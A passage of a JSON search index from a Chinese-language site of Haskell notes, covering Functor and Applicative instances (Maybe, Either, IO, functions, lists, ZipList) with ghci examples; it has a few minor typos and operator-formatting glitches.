\u63a5\u6536\u4e00\u4e2a\u51fd\u6570\u548c\u4e00\u4e2a\u5217\u8868\uff0c\u5b83\u4f1a\u5c06\u5217\u8868\u4e2d\u7684\u6240\u6709\u5143\u7d20\u90fd\u5e94\u7528\u8fd9\u4e2a\u51fd\u6570\u540e\u518d\u8fd4\u56de\u8fd9\u4e2a\u5217\u8868","title":"[]"},{"location":"cs/pl/haskell/#maybe","text":"Maybe \u4e5f\u5177\u6709 kind * -> *\uff0c\u5b83\u4e5f\u662f\u4e00\u4e2a\u51fd\u5b50\uff1a instance Functor Maybe where fmap f Nothing = Nothing fmap f ( Just x ) = Just ( f x ) ghci > fmap ( * 2 ) Nothing Nothing ghci > fmap ( * 2 ) ( Just 2 ) Just 4","title":"Maybe"},{"location":"cs/pl/haskell/#either-a","text":"Either \u7684 kind \u662f* -> * -> *\uff0c\u663e\u7136\u5b83\u4e0d\u662f\u51fd\u5b50\uff0c\u4f46\u662f\u56fa\u5b9a\u4e86\u4e00\u4e2a\u4f20\u5165\u7c7b\u578b\u7684 Either a \u7684 kind \u662f* -> *\uff0c\u4e5f\u662f\u4e00\u4e2a\u51fd\u5b50\uff1a instance Functor ( Either a ) where fmap f ( Left x ) = Left x fmap f ( Right x ) = Right ( f x ) ghci > fmap ( * 2 ) ( Left 4 ) Left 4 ghci > fmap ( * 2 ) ( Right 4 ) Right 8 \u56e0\u4e3a\u4f7f\u7528 Either \u65f6\u4e00\u822c\u7528\u53f3\u503c\u8868\u793a\u6b63\u5e38\u7ed3\u679c\uff0c\u5de6\u503c\u8868\u793a\u5f02\u5e38\u4fe1\u606f\uff0c\u6240\u4ee5\u4f7f\u7528 fmap \u65f6\u53ea\u5bf9\u53f3\u503c\u8fdb\u884c\u64cd\u4f5c\uff0c\u5982\u679c\u65f6\u5de6\u503c\u5219\u4fdd\u6301\u4e0d\u53d8\uff08\u800c\u4e14\u5de6\u503c\u6b64\u65f6\u4e5f\u4f5c\u4e3a\u786e\u5b9a\u7c7b\u578b\u786e\u5b9a\u503c\u5b58\u5728\uff09","title":"Either a"},{"location":"cs/pl/haskell/#io_1","text":"IO \u4e5f\u662f\u4e00\u4e2a\u51fd\u5b50\uff0c\u4f7f\u7528 fmap \u5bf9 IO \u4e2d\u5185\u5bb9\u5e94\u7528\u51fd\u6570\uff1a instance Functor IO where fmap f action = do result <- action return ( f result ) ghci > fmap ( \"input: \" ++ ) getLine test \"input: test\"","title":"IO"},{"location":"cs/pl/haskell/#a","text":"(,) \u8868\u793a\u4e00\u4e2a\u4e8c\u5143\u7ec4\u7684\u7c7b\u578b\u6784\u9020\u5668\uff0c(,) :: * -> * -> *\uff0c\u800c\u786e\u5b9a\u4e86\u7b2c\u4e00\u4e2a\u5143\u7d20\u7684\u7c7b\u578b\u540e\u5c31\u53d8\u6210\u4e86 (,) a\uff0c\u5b83\u7684 kind \u662f * -> *\u3002\u4e5f\u662f\u4e00\u4e2a\u51fd\u5b50\uff0c\u8fdb\u884c fmap \u51fd\u6570\u65f6\u53ea\u5bf9\u7b2c\u4e8c\u4e2a\u5143\u7d20\u5e94\u7528\uff1a instance Functor ((,) a ) where fmap f ( x , y ) = ( x , f y ) \u53ea\u5269\u4e00\u4e2a\u5143\u7d20\u7684\u4e09\u5143\u7ec4\u548c\u56db\u5143\u7ec4\u4e5f\u90fd\u662f\u51fd\u5b50\uff0cfmap \u4e5f\u53ea\u5bf9\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u5e94\u7528\uff1a instance Functor ((,,) a b ) where fmap f ( a , b , c ) = ( a , b , f c ) instance Functor ((,,,) a b c ) where fmap f ( a , b , c , d ) = ( a , b , c , f d )","title":"(,) a"},{"location":"cs/pl/haskell/#-r","text":"-> \u4e5f\u662f\u4e00\u4e2a\u7c7b\u578b\u6784\u9020\u5668\uff0c\u5b83\u7684 kind\uff1a (->) :: * -> * -> * \u4e00\u4e2a\u6620\u5c04\uff08\u4e00\u5143\u51fd\u6570\uff09\u7684\u7c7b\u578b a -> b \u4e5f\u53ef\u4ee5\u5199\u6210 (->) a b\uff0c\u5b83\u662f\u7531\u7c7b\u578b a \u548c\u7c7b\u578b b \u8f93\u5165\u5230\u7c7b\u578b\u6784\u9020\u5668 -> \u4e2d\u540e\u5f62\u6210\u7684\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b\u3002\u6240\u4ee5\u786e\u5b9a\u4e86\u8f93\u5165\u7c7b\u578b\u540e\u7684\u4e00\u5143\u51fd\u6570\u7684\u7c7b\u578b\u5c31\u662f (->) r\uff08\u5176\u4e2d r \u662f\u8f93\u5165\u7684\u7c7b\u578b\uff09 \u89c4\u5b9a\u7684 fmap \u7684\u7c7b\u578b\u7b7e\u540d\u662f\uff1a fmap :: (a -> b) -> f a -> f b \u5176\u4e2d\u7684 f \u662f\u51fd\u5b50\uff0c\u800c\u5728\u8fd9\u4e2a\u5b9e\u4f8b\u4e2d (->) r \u5c31\u662f\u51fd\u5b50\uff0c\u5c06\u5176\u5e26\u5165 f \u53ef\u4ee5\u5f97\u5230\uff1a fmap :: (a -> b) -> ((-> r) a) -> ((-> r) b) \u628a\u5176\u4e2d\u7684 (->) \u6362\u6210\u4e2d\u7f00\u53ef\u4ee5\u5f97\u5230\uff1a fmap :: (a -> b) -> (r -> a) -> (r -> b) \u4f20\u5165\u4e24\u4e2a\u51fd\u6570\uff0c\u4e00\u4e2a\u7c7b\u578b\u4e3a a -> b\uff0c\u4e00\u4e2a\u7c7b\u578b\u4e3a r -> a\uff0c\u8fd4\u56de\u4e00\u4e2a\u51fd\u6570\uff0c\u7c7b\u578b\u4e3a r -> b\u3002 \u4e0d\u96be\u63a8\u6d4b\u8fd9\u4e2a fmap \u662f\u5c06\u8fd9\u4e24\u4e2a\u51fd\u6570\u590d\u5408\u4e86\uff0c\u5148\u5bf9\u8f93\u5165\u5bf9 r \u5e94\u7528\u7b2c\u4e8c\u4e2a\u51fd\u6570\u4ea7\u751f\u7c7b\u578b a \u7684\u7ed3\u679c\uff0c\u7136\u540e\u5728\u5e94\u7528\u7b2c\u4e00\u4e2a\u51fd\u6570\u4ea7\u751f\u7c7b\u578b b \u7684\u7ed3\u679c\uff0c\u6240\u4ee5 (->) r \u5b9a\u4e49\u7684 fmap \u662f\uff1a instance Functor (( -> ) r ) where fmap f g = ( \\ x -> f ( g x )) \u6240\u4ee5 (->) r \u7684 fmap \u5176\u5b9e\u5c31\u662f\u51fd\u6570\u590d\u5408 (.)\uff1a instance Functor (( -> ) r ) where fmap = ( . ) ghci > : t fmap ( * 3 ) ( + 100 ) fmap ( * 3 ) ( + 100 ) :: ( Num a ) => a -> a ghci > fmap ( * 3 ) ( + 100 ) 1 303 ghci > ( * 3 ) ` fmap ` ( + 100 ) $ 1 303 ghci > ( * 3 ) . ( + 100 ) $ 1 303","title":"(-&gt;) r"},{"location":"cs/pl/haskell/#functor-laws","text":"\u6240\u6709\u7684\u51fd\u5b50\u90fd\u5e94\u8be5\u6ee1\u8db3\u4e24\u4e2a\u5b9a\u5f8b\u3002\u8fd9\u4e24\u4e2a\u5b9a\u5f8b\u4e0d\u662f Haskell \u5f3a\u5236\u8981\u6c42\u7684\uff0c\u4f46\u5e94\u8be5\u786e\u4fdd\u4e00\u4e2a\u51fd\u5b50\u6ee1\u8db3\u8fd9\u4e24\u4e2a\u5b9a\u5f8b\uff1a fmap id = id \uff08\u5176\u4e2d id \u4e3a\u51fd\u6570 (\\x -> x) \uff09\uff1a\u5373\u5bf9\u4e00\u4e2a\u51fd\u5b50 fmap id\uff0c\u90a3\u5b83\u5e94\u8be5\u8fd4\u56de\u672c\u8eab\uff08fmap id a = id a = a\uff0ca \u4e3a\u4e00\u4e2a\u51fd\u5b50\uff09\uff0c\u6bd4\u5982\uff1a ghci > fmap id [ 1 , 2 , 3 ] [ 1 , 2 , 3 ] ghci > fmap id ( Just 2 ) Just 2 fmap (f . g) = fmap f . fmap g \uff1a\u5373\u51fd\u5b50\u7684 fmap \u652f\u6301\u7ed3\u5408\u5f8b fmap (f . g) a = fmap f . fmap g $ a = fmap f (fmap g a)\uff0c\u5176\u4e2d a \u4e3a\u4e00\u4e2a\u51fd\u5b50 fmap (f . g) (Just x) = fmap f (fmap g (Just x)) = fmap f (Just (g x)) = Just (f (g x)) ghci > fmap (( * 3 ) . ( + 100 )) ( Just 1 ) Just 303 \u6ee1\u8db3\u7b2c\u4e00\u4e2a\u5b9a\u5f8b\u7684\u51fd\u5b50\u4e00\u5b9a\u6ee1\u8db3\u7b2c\u4e8c\u4e2a\u5b9a\u5f8b\uff0c\u6240\u4ee5\u53ea\u8981\u68c0\u67e5\u51fd\u5b50\u662f\u5426\u6ee1\u8db3\u7b2c\u4e00\u4e2a\u5b9a\u5f8b\u5373\u53ef","title":"Functor Laws"},{"location":"cs/pl/haskell/#intuition","text":"\u5bf9\u4e8e\u51fd\u5b50\u548c fmap\uff0c\u6709\u4e24\u79cd\u7406\u89e3\u65b9\u6cd5 \u51fd\u5b50\u662f\u4e00\u79cd\u5bb9\u5668\uff08container\uff09\uff1bfmap \u63a5\u6536\u4e00\u4e2a\u51fd\u6570\u548c\u4e00\u4e2a\u5bb9\u5668\uff0c\u5728\u5bb9\u5668\u5185\u90e8\u5e94\u7528\u8fd9\u4e2a\u51fd\u6570\uff0c\u8fd4\u56de\u5e94\u7528\u540e\u7684\u65b0\u5bb9\u5668 \u51fd\u5b50\u662f\u4e00\u79cd\u8ba1\u7b97\u4e0a\u4e0b\u6587\uff08context\uff09\uff1bfmap \u662f\u67ef\u91cc\u5316\u7684\uff0c\u628a\u5176\u7c7b\u578b\u7b7e\u540d\u770b\u4f5c fmap :: (a -> b) -> (f a -> f b) \u2003\u2003\u63a5\u6536\u4e00\u4e2a\u51fd\u6570\u8fd4\u56de\u53e6\u4e00\u4e2a\u51fd\u6570\uff0c\u4f20\u5165\u51fd\u6570 g :: a -> b\uff0cfmap \u5c06\u5176\u8f6c\u6362\u4e3a\u65b0\u7684\u51fd\u6570 fmap g :: f a -> f b \u2003\u2003\u4f7f\u666e\u901a\u7684\u51fd\u6570 g \u53ef\u4ee5\u5728\u8ba1\u7b97\u4e0a\u4e0b\u6587 f \u4e2d\u4f7f\u7528\uff0c\u8fd9\u79cd\u8f6c\u6362\u4e5f\u88ab\u79f0\u4e3a\u63d0\u5347\uff08lift\uff09","title":"Intuition"},{"location":"cs/pl/haskell/#_10","text":"","title":"\u5e38\u7528\u51fd\u6570"},{"location":"cs/pl/haskell/#_11","text":"<$> \u51fd\u6570\u662f fmap \u7684\u4e2d\u7f00\u5f62\u5f0f\uff08\u5b83\u770b\u7740\u7c7b\u4f3c $ \uff0c f $ 3 \u5c06 f \u5e94\u7528\u5728\u5355\u4e2a\u503c 3 \u4e0a\uff0c\u800c f <$> [1, 2, 3] \u5c06 f \u5e94\u7528\u5728\u4e00\u4e2a\u51fd\u5b50\u4e0a\uff0c\u4e5f\u5c31\u662f\u5e94\u7528\u5728\u4e00\u4e2a\u51fd\u5b50\u5185\u90e8\u7684\u6240\u6709\u503c\u4e0a\uff09\uff1a ghci > fmap ( * 2 ) ( Just 2 ) 4 ghci > ( * 2 ) <$> Just 2 4","title":"&lt;$&gt;"},{"location":"cs/pl/haskell/#_12","text":"$> \u51fd\u6570\u5305\u542b\u5728 Data.Functor \u6a21\u5757\u4e2d ($>) :: Functor f => f a -> b -> f b Functor \u5b9a\u4e49\u65f6\u8981\u6c42\u4e86 <$ \u51fd\u6570\uff0c\u5c06\u51fd\u5b50\u5185\u90e8\u7684\u5143\u7d20\u5168\u90e8\u66ff\u6362\u4e3a\u6307\u5b9a\u7684\u67d0\u4e2a\u503c\uff0c\u800c $> \u6b63\u597d\u5c06 <$ \u51fd\u6570\u7684\u4e24\u4e2a\u53c2\u6570\u53cd\u4e86\u8fc7\u6765\uff0c\u76f8\u5f53\u4e8e flip (<$) \uff1a ghci > 'a' <$ [ 1 , 2 , 3 ] \"aaa\" ghci > [ 1 , 2 , 3 ] $> 'a' \"aaa\"","title":"$&gt;"},{"location":"cs/pl/haskell/#void","text":"void \u51fd\u6570\u4e5f\u5305\u542b\u5728 Data.Functor \u6a21\u5757\u4e2d void :: Functor f => f a -> f () void \u51fd\u6570\u628a\u4e00\u4e2a\u51fd\u5b50\u5185\u90e8\u7684\u5168\u90e8\u5143\u7d20\u90fd\u53d8\u6210\u7a7a\uff08 () \uff09\uff0c void x \u76f8\u5f53\u4e8e () <$ x \uff1a ghci > void [ 1 , 2 , 3 ] [ () , () , () ] ghci > void ( Just 2 ) Just ()","title":"void"},{"location":"cs/pl/haskell/#applicative-functor","text":"\u5e94\u7528\u51fd\u5b50\uff08Applicative Functor\uff09\u662f\u51fd\u5b50\u7684\u5347\u7ea7\u7248\uff0c\u5b83\u5305\u542b\u5728 Control.Applicative \u6a21\u5757\u4e2d\u3002 fmap \u8fdb\u884c\u7684\u64cd\u4f5c\u662f\u5c06\u4e00\u4e2a\u666e\u901a\u4e00\u5143\u51fd\u6570\u5e94\u7528\u5728\u4e00\u4e2a\u51fd\u5b50\u5185\u90e8\u3002\u800c\u5982\u679c\u8981\u5c06\u4e00\u4e2a\u5305\u542b\u51fd\u6570\u7684\u51fd\u5b50\u5e94\u7528\u5728\u53e6\u4e00\u4e2a\u51fd\u5b50\u4e0a\uff0cfmap \u5c31\u5904\u7406\u4e0d\u4e86\u4e86\uff0c\u4f46\u662f\u5e94\u7528\u51fd\u5b50\u7684\u65b9\u6cd5\u53ef\u4ee5\u5904\u7406\u3002\u5e94\u7528\u51fd\u5b50\u7684\u5b9a\u4e49\uff1a class Functor f => Applicative f where pure :: a -> f a ( <*> ) :: f ( a -> b ) -> f a -> f b \u5e94\u7528\u51fd\u5b50\u8981\u6c42\u5b9e\u73b0\u4e24\u4e2a\u51fd\u6570\uff1a pure :: a -> f a\uff0c\u4e0d\u96be\u7406\u89e3\uff0cpure \u63a5\u6536\u4e00\u4e2a\u503c\uff0c\u5e76\u5c06\u5176\u653e\u5728\u9ed8\u8ba4\u7684\u4e0a\u4e0b\u6587/\u5bb9\u5668\u4e2d\u3002\u5bf9\u4e8e\u5217\u8868\uff0cpure = []\uff1b\u5bf9\u4e8e Maybe\uff0cpure = Just <*> :: f (a -> b) -> f a -> f b\uff0c\u7c7b\u4f3c\u4e8e fmap :: (a -> b) -> f a -> f b\uff0c\u4f46\u4e0d\u540c\u7684\u662f <*> \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u7684\u7c7b\u578b\u662f f (a -> b) \u4e0d\u662f a -> b\u3002\u6240\u4ee5 <*> \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5728\u4e0a\u4e0b\u6587\u4e2d\u7684\u51fd\u6570\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u666e\u901a\u51fd\u6570\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c<*> \u63a5\u6536\u4e00\u4e2a\u88c5\u6709\u51fd\u6570\u7684\u51fd\u5b50\u548c\u53e6\u4e00\u4e2a\u51fd\u5b50\uff0c\u5e94\u7528\u51fd\u6570\u540e\u8fd4\u56de\u65b0\u7684\u51fd\u5b50\u3002","title":"Applicative Functor"},{"location":"cs/pl/haskell/#applicative-functor_1","text":"","title":"Applicative Functor \u5b9e\u4f8b"},{"location":"cs/pl/haskell/#maybe_1","text":"Maybe \u662f\u4e00\u4e2a\u5e94\u7528\u51fd\u5b50\uff1a instance Applicative Maybe where pure = Just Nothing <*> _ = Nothing ( Just f ) <*> something = fmap f something pure \u51fd\u6570\uff1a\u5c06\u4e00\u4e2a\u503c\u653e\u5728\u9ed8\u8ba4\u7684\u4e0a\u4e0b\u6587\u4e2d\uff0c\u800c\u5bf9\u4e8e Maybe\uff0c\u9ed8\u8ba4\u7684\u4e0a\u4e0b\u6587\u5c31\u662f Just\uff0c\u6240\u4ee5 pure x = Just x <*> \u51fd\u6570\uff1a\u5c06\u88c5\u6709\u51fd\u6570\u7684\u51fd\u5b50\u4e2d\u7684\u51fd\u6570\u5e94\u7528\u53e6\u4e00\u4e2a\u51fd\u5b50\u4e2d \u7b2c\u4e00\u4e2a\u53c2\u6570\u662f Nothing\uff0c\u5373\u7b2c\u4e00\u4e2a\u51fd\u5b50\u4e0d\u5305\u542b\u51fd\u6570\uff0c\u90a3\u8fd4\u56de\u7684\u7ed3\u679c\u5c31\u4e5f\u4f1a\u662f Nothing \u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u88c5\u6709\u51fd\u6570f\u7684\u51fd\u5b50 Just f\uff0c\u5c06\u5176\u4e2d\u7684\u51fd\u6570f\u5e94\u7528\u5728\u51fd\u5b50 something \u4e2d\uff0c\u53ea\u9700\u8981\u5c06 f \u63d0\u53d6\u51fa\u6765\u4f7f\u7528 fmap \u5e94\u7528\u5728\u51fd\u5b50 something \u4e2d\u5373\u53ef \u5b9e\u9645\u5e94\u7528\u7684\u4f8b\u5b50\uff1a ghci > Just ( + 3 ) <*> Just 9 Just 12 ghci > pure ( + 3 ) <*> Just 9 Just 12 ghci > ( + 3 ) <$> Just 9 Just 12 ghci > Nothing <*> Just 9 Nothing \u7b2c\u4e00\u4e2a\u4f8b\u5b50\uff0cJust (+3) \u662f\u4e00\u4e2a\u5305\u542b\u51fd\u6570 (+3) \u7684\u51fd\u5b50\uff0c\u5c06\u5176\u5e94\u7528\u5728\u51fd\u5b50 Just 9 \u4e2d\uff0c\u5c06 Just (+3) \u4e2d\u7684\u51fd\u6570 (+3) \u63d0\u53d6\u51fa\u6765\uff0c\u5e94\u7528\u5728 Just 9 \u4e2d\uff0c\u5f97\u5230\u4e86 Just 12 \u7b2c\u4e8c\u4e2a\u4f8b\u5b50\uff0c\u53ef\u4ee5\u53d1\u73b0\uff0c\u5728\u8fd9\u91cc pure (+3) \u548c Just (+3) \u7b49\u6548\uff0c\u56e0\u4e3a pure \u5c06\u51fd\u6570 (+3) \u653e\u5728\u9ed8\u8ba4\u4e0a\u4e0b\u6587\u4e2d\uff0c\u4e5f\u5c31\u662f Just \u4e2d\u4e86 \u800c <*> \u80fd\u505a\u7684\u4e0d\u6b62\u8fd9\u4e9b\uff0c\u4ed6\u53ef\u4ee5\u8fde\u7eed\u4f20\u5165\u66f4\u591a\u51fd\u5b50\u4f5c\u4e3a\u53c2\u6570\uff0c\u6bd4\u5982\uff1a ghci > pure ( + ) <*> Just 3 <*> Just 9 Just 12 ghci > pure ( \\ x y z -> x + y + z ) <*> Just 3 <*> Just 4 <*> Just 5 Just 12 <*> \u51fd\u6570\u4e00\u6837\u662f\u9ed8\u8ba4\u5de6\u7ed3\u5408\u7684\uff0cpure (+) < > Just 3 < > Just 9 \u76f8\u5f53\u4e8e (pure (+) < > Just 3) < > Just 9\uff0c\u800c pure (+) < > Just 3 \u5c06 (+) \u5e94\u7528\u5728Just 3 \u4e0a\uff0c\u5f97\u5230\u7684\u5c31\u662f Just (+3) \u4e00\u4e2a\u5305\u542b\u51fd\u6570\u7684\u51fd\u5b50\uff0c\u53c8\u5c06\u5176\u901a\u8fc7 < > \u5e94\u7528\u5728\u4e86 Just 9 \u4e0a\uff0c\u5f97\u5230\u4e86 Just 12: pure ( \\ x y z -> x + y + z ) <*> Just 3 <*> Just 4 <*> Just 5 = ( pure ( \\ x y z -> x + y + z ) <*> Just 3 ) <*> Just 4 <*> Just 5 = ( Just ( \\ y z -> 3 + y + z ) <*> Just 4 ) <*> Just 5 = Just ( \\ z -> 3 + 4 + z ) <*> Just 5 = Just ( + 7 ) <*> Just 5 = Just 12 \u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528\u7c7b\u4f3c pure f < > x < > y <*> ... \u6765\u5c06\u4e00\u4e2a\u666e\u901a\u591a\u5143\u51fd\u6570f\u5e94\u7528\u5728\u591a\u4e2a\u51fd\u5b50\u4e0a\u3002 \u800c\u4e14 pure f < > x \u5b9e\u9645\u4e0a\u5148\u5c06\u666e\u901a\u51fd\u6570f\u653e\u5728\u4e0a\u4e0b\u6587\u4e2d\uff0c\u7136\u540e\u6267\u884c < > \u65f6\u518d\u5c06\u5176\u63d0\u53d6\u51fa\u6765\u6267\u884c fmap\uff0c\u6240\u4ee5\u5b83\u5c31\u76f8\u5f53\u4e8e\u5c06\u666e\u901a\u51fd\u6570\u5e94\u7528\u5728\u51fd\u5b50 x \u4e0a\uff0c\u5373 fmap f x\uff0c\u4e5f\u53ef\u4ee5\u5199\u6210 f <$> x\u3002\u6240\u4ee5\u5e38\u7528\u7684\u5199\u6cd5\u5c31\u662f\uff1a f < $> x < *> y < *> ...","title":"Maybe"},{"location":"cs/pl/haskell/#_13","text":"\u5217\u8868\u4e5f\u662f\u4e00\u4e2a\u5e94\u7528\u51fd\u5b50\uff1a instance Applicative [] where pure x = [ x ] fs <*> xs = [ f x | f <- fs , x <- xs ] - pure \u51fd\u6570\uff1a\u5bf9\u4e8e\u5217\u8868\u800c\u8a00\uff0c\u4e00\u4e2a\u503c\u7684\u6700\u5c0f\u4e0a\u4e0b\u6587\u5c31\u662f\u53ea\u5305\u542b\u8fd9\u4e2a\u503c\u7684\u5217\u8868 [x] - <*> \u51fd\u6570\uff1a\u5217\u8868\u7684 <*> \u51fd\u6570\u662f\u901a\u8fc7\u5217\u8868\u63a8\u5bfc\u6765\u5b9e\u73b0\u7684\u3002\u56e0\u4e3a\u4e0d\u540c\u4e8e Maybe \u7684 Just \u53ea\u5305\u542b\u4e00\u4e2a\u503c\uff0c\u5217\u8868\u53ef\u4ee5\u5305\u542b\u5f88\u591a\u503c\uff0c\u7b2c\u4e00\u4e2a\u4f20\u5165\u7684\u5217\u8868\u4e2d\u53ef\u80fd\u4f1a\u5305\u542b\u5f88\u591a\u51fd\u6570\uff0c\u7b2c\u4e8c\u4e2a\u4f20\u5165\u7684\u5217\u8868\u4e5f\u4f1a\u5305\u542b\u5f88\u591a\u503c\uff0c\u6240\u4ee5\u5c31\u9700\u8981\u5148\u4ece\u7b2c\u4e00\u4e2a\u5217\u8868\u4e2d\u53d6\u51fa\u4e00\u4e2a\u51fd\u6570\u7136\u540e\u4f9d\u6b21\u5e94\u7528\u5728\u7b2c\u4e8c\u4e2a\u5217\u8868\u7684\u6bcf\u4e2a\u503c\u4e2d\uff0c\u518d\u53d6\u51fa\u7b2c\u4e00\u4e2a\u5217\u8868\u4e2d\u7684\u7b2c\u4e8c\u4e2a\u51fd\u6570\u5e94\u7528\u5728\u7b2c\u4e8c\u4e2a\u5217\u8868\u7684\u6bcf\u4e2a\u503c\u4e2d\u2026\u2026\u6700\u7ec8\u8fd4\u56de\u5f97\u5230\u7684\u6240\u6709\u7ed3\u679c\u7684\u5217\u8868 \u4f7f\u7528\u4f8b\u5b50\uff1a ghci > [( + 3 ), ( * 2 )] <*> [ 1 , 2 ] [ 4 , 5 , 2 , 4 ] ghci > [( + ), ( * )] <*> [ 1 , 2 ] <*> [ 3 , 4 ] [ 4 , 5 , 5 , 6 , 3 , 4 , 6 , 8 ]","title":"[]"},{"location":"cs/pl/haskell/#io_2","text":"instance Applicative IO where pure = return a <*> b = do f <- a x <- b return ( f x ) \u4e5f\u4e0d\u96be\u7406\u89e3\uff0cpure \u51fd\u6570\u76f4\u63a5\u5c06\u4f20\u5165\u7684\u503c return\uff0c\u76f8\u5f53\u4e8e\u653e\u5728\u4e86 IO \u7684\u4e0a\u4e0b\u6587\u4e2d\u3002\u800c <*> \u51fd\u6570\u5148\u5c06\u4e24\u4e2a IO \u4e2d\u5185\u5bb9\u63d0\u53d6\u51fa\u6765\uff0c\u7136\u540e\u5e94\u7528\u51fd\u6570\u540e return\uff0c\u5f62\u6210\u65b0\u7684 IO \u51fd\u5b50 ghci > ( ++ ) <$> getLine <*> getLine Line1 Line2 \"Line1Line2\"","title":"IO"},{"location":"cs/pl/haskell/#-r_1","text":"(->) r \u540c\u6837\u4e5f\u662f\u4e00\u4e2a\u5e94\u7528\u51fd\u5b50\uff0c\u548c\u51fd\u5b50\u7684\u5206\u6790\u4e00\u6837\uff0c\u5148\u6765\u5206\u6790\u5b83\u7684 <*> \u51fd\u6570\u7684\u7c7b\u578b\u7b7e\u540d\uff1a < *> :: f (a -> b) -> f a -> f b \u5176\u4e2d f \u4e3a (->) r\uff0c\u5c06\u5176\u4ee3\u5165\u5e76\u66ff\u6362\u4e3a\u4e2d\u7f00\uff1a < *> :: (r -> a -> b) -> (r -> a) -> (r -> b) \u53ef\u4ee5\u770b\u51fa\u5b83\u63a5\u6536\u4e24\u4e2a\u51fd\u6570 f :: r -> a -> b\u3001g :: r -> a\uff0c\u8fd4\u56de\u53e6\u4e00\u4e2a\u51fd\u6570 h :: (r -> b) \u90a3\u4e48\u8fd4\u56de\u7684\u51fd\u6570\u7684\u8f93\u5165\u4e3a r\uff0c\u8f93\u51fa\u4e3a b\uff0c\u6240\u4ee5\u5148\u5bf9\u8f93\u5165\u5e94\u7528\u51fd\u6570 g \u5f97\u5230 a\uff0c\u7136\u540e\u5728\u5bf9 r \u548c a \u5e94\u7528 f \u5f97\u5230 b\uff0c\u6240\u4ee5\u63a8\u6d4b <*> \u51fd\u6570\u7684\u64cd\u4f5c\u5c31\u662f\uff1a \\x -> f x (g x) \u4e8e\u662f\uff1a instance Applicative (( -> ) r ) where pure x = ( \\ _ -> x ) f <*> g = \\ x -> f x ( g x ) \u5c06\u4e00\u4e2a\u503c\u653e\u5728\u51fd\u6570\u7684\u4e0a\u4e0b\u6587\u4e2d\uff0c\u6700\u5c0f\u4e0a\u4e0b\u6587\u5c31\u5e94\u8be5\u8fd4\u56de\u8fd9\u4e2a\u503c\u672c\u8eab\uff0c\u6240\u4ee5 pure \u51fd\u6570\u5b9a\u4e49\u4e3a (_ -> x)\uff0c\u5373\u65e0\u8bba\u8f93\u5165\u4ec0\u4e48\uff0c\u90fd\u8fd4\u56de x \u5e94\u7528\u51fd\u5b50\u7684 <*> \u51fd\u6570\u63a5\u6536\u4e24\u4e2a\u51fd\u5b50\uff0c\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u51fd\u5b50\u3002\u5bf9\u4e8e (->) r\uff0c\u5b83\u63a5\u6536\u4e24\u4e2a\u51fd\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u51fd\u6570\u3002\u5177\u4f53\u4f8b\u5b50\uff1a ghci > ( + ) <$> ( + 3 ) <*> ( * 100 ) $ 5 508 \u6267\u884c\u8fd9\u53e5\u65f6\u53d1\u751f\u4e86\u4ec0\u4e48\uff1f\uff1a ( + ) <$> ( + 3 ) <*> ( * 100 ) $ 5 = (( + ) <$> ( + 3 )) <*> ( * 100 ) $ 5 = (( + ) . ( + 3 )) <*> ( * 100 ) $ 5 = ( \\ a -> ( + ) (( + 3 ) a )) <*> ( * 100 ) $ 5 = ( \\ a b -> ( a + 3 + b )) <*> ( * 100 ) $ 5 = ( \\ x -> x + 3 + (( * 100 ) x )) $ 5 = ( \\ x -> x + 3 + x * 100 ) $ 5 = 5 + 3 + 5 * 100 = 508 = ( 5 + 3 ) + ( 5 * 100 ) \u6240\u4ee5\u5c31\u76f8\u5f53\u4e8e\u5148\u5bf9\u8f93\u5165\u5206\u522b\u6267\u884c (+3) \u548c (*100)\uff0c\u7136\u540e\u5c06\u4e24\u4e2a\u7ed3\u679c\u6267\u884c\u4e86 (+) \u540c\u6837\uff1a ghci > ( \\ x y z -> [ x , y , z ]) <$> ( + 3 ) <*> ( * 2 ) <*> ( / 2 ) $ 5 [ 8.0 , 10.0 , 2.5 ] \u5148\u5bf9 5 \u5206\u522b\u6267\u884c (+3)\u3001(*2)\u3001(/2)\uff0c\u7136\u540e\u5c06\u5f97\u5230\u7684\u4e09\u4e2a\u7ed3\u679c\u4f20\u5165 (\\x y z -> [x,y,z]) \u5f97\u5230\u4e86\u6700\u7ec8\u7684\u7ed3\u679c f <$> g <*> h <*> i = ( \\ x -> f ( g x ) ( h x ) ( i x ))","title":"(-&gt;) r"},{"location":"cs/pl/haskell/#ziplist","text":"\u666e\u901a\u5217\u8868\u5b9e\u73b0\u7684 <*> \u51fd\u6570\u662f\u5c06\u6bcf\u4e2a\u51fd\u6570\u5e94\u7528\u5728\u6240\u6709\u503c\u4e0a\uff0c\u4f46\u8fd8\u6709\u4e00\u79cd\u5b9e\u73b0\u65b9\u6cd5\u662f\u5c06\u6bcf\u4e2a\u51fd\u6570\u5e94\u7528\u5728\u5bf9\u5e94\u503c\u4e0a\uff0c\u56e0\u4e3a\u540c\u4e00\u4e2a\u7c7b\u578b\u4e0d\u80fd\u5b58\u5728\u540c\u4e00\u51fd\u6570\u7684\u4e24\u79cd\u5b9e\u73b0\u5f62\u5f0f\uff0c\u6240\u4ee5\u5f15\u5165\u4e86\u4e00\u4e2a\u65b0\u7684\u5217\u8868 ZipList\uff0c\u5305\u542b\u5728 Control.Applicative \u6a21\u5757\u4e2d instance Applicative ZipList where pure x = ZipList ( repeat x ) ZipList fs <*> ZipList xs = ZipList ( zipWith ( $ ) fs xs ) \u4f46\u662f ZipList \u5e76\u4e0d\u662f Show \u7684\u5b9e\u4f8b\uff0c\u6240\u4ee5\u4e0d\u80fd\u76f4\u63a5\u663e\u793a\u51fa\u6765\uff0c\u8981\u4f7f\u7528 getZipList \u6765\u83b7\u53d6\u5b83\u5185\u90e8\u7684\u5217\u8868\uff1a ghci > getZipList $ ( + ) <$> ZipList [ 1 , 2 , 3 ] <*> ZipList [ 100 , 100 .. ] [ 101 , 102 , 103 ] ghci > getZipList $ (,,) <$> ZipList \"dog\" <*> ZipList \"cat\" <*> ZipList \"rat\" [( 'd' , 'c' , 'r' ),( 'o' , 'a' , 'a' ),( 'g' , 't' , 't' 